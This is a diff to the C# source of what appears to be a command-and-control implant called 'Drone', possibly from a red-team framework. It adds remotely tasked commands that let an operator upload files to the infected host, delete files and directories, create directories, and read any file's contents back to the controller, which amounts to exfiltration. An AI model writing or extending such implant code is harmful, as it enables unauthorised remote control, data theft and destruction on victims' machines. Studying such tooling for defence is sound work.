@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Diagnostics;
+using System.Diagnostics;   
+using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
@@ -32,6 +33,27 @@ namespace Drone
             new ("ls", "List filesystem", GetDirectoryListing, new List<Command.Argument>
             {
                 new("path")
+            }),
+            new("upload", "Upload a file to the current working directory of the Drone", UploadFile, new List<Command.Argument>
+            {
+               new("/path/to/origin", false, true),
+               new ("destination-filename" ,false)
+            }),
+            new("rm", "Delete a file", DeleteFile, new List<Command.Argument>
+            {
+               new("/path/to/file", false)
+            }),
+            new("rmdir", "Delete a directory", DeleteDirectory, new List<Command.Argument>
+            {
+                new("/path/to/directory", false)
+            }),
+            new("mkdir", "Create a directory", CreateDirectory, new List<Command.Argument>
+            {
+               new("/path/to/new-dir", false) 
+            }),
+            new("cat", "Read a file as text", ReadTextFile, new List<Command.Argument>
+            {
+                new("/path/to/file.txt")
             }),
             new("ps", "List running processes", GetProcessListing),
             new ("getuid", "Get current identity", GetCurrentIdentity),
@@ -91,6 +113,33 @@ namespace Drone
             var result = Host.GetDirectoryListing(directory);
             
             Drone.SendResult(task.TaskGuid, result.ToString());
+        }
+
+        private void UploadFile(DroneTask task, CancellationToken token)
+        {
+            var path = Path.Combine(Host.GetCurrentDirectory(), task.Arguments[0]);
+            File.WriteAllBytes(path, Convert.FromBase64String(task.Artefact));
+        }
+        
+        private void DeleteFile(DroneTask task, CancellationToken token)
+        {
+            File.Delete(task.Arguments[0]);
+        }
+
+        private void DeleteDirectory(DroneTask task, CancellationToken token)
+        {
+            Directory.Delete(task.Arguments[0]);
+        }
+        
+        private void CreateDirectory(DroneTask task, CancellationToken token)
+        {
+            Directory.CreateDirectory(task.Arguments[0]);
+        }
+        
+        private void ReadTextFile(DroneTask task, CancellationToken token)
+        {
+            var text = File.ReadAllText(task.Arguments[0]);
+            Drone.SendResult(task.TaskGuid, text);
         }
         
         private void GetProcessListing(DroneTask task, CancellationToken token)
